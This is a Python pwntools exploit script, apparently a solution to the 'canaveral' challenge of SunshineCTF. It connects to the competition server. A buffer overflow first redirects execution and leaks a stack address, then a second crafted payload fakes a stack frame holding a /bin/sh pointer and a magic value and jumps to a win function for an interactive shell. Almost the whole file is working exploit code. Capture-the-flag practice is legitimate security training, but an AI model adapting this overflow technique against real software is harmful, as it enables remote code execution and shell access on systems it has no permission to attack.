#!/usr/bin/env python3

from pwn import *

elf = ELF("./canaveral")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

gs = '''
set disassembly-flavor intel
break *0x4011e9
break *0x00401224
'''

domain = "chal.sunshinectf.games"
port = 25603

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

#========= exploit here ===================
binsh = 0x00402008

r.sendline(b"A"*72 + p64(0x004012bd))
r.recvuntil(b"prize: ")
buffer_addr = int((r.recvline().strip().decode()),16)
r.info(hex(buffer_addr))

# stack frame
payload  = b"A" * 0x10               
payload += p64(binsh)                          # [rbp - 0x10]
payload += p32(0) + p32(0x31337)               # [rbp - 0x4]
payload += p32(0)                              # buffer + 0x20             
payload += b"C" * (64 - len(payload))  
payload += p64(buffer_addr + 0x20)             # rbp
payload += p64(0x004011e9)                     # win addr

r.sendline(payload)
r.interactive()
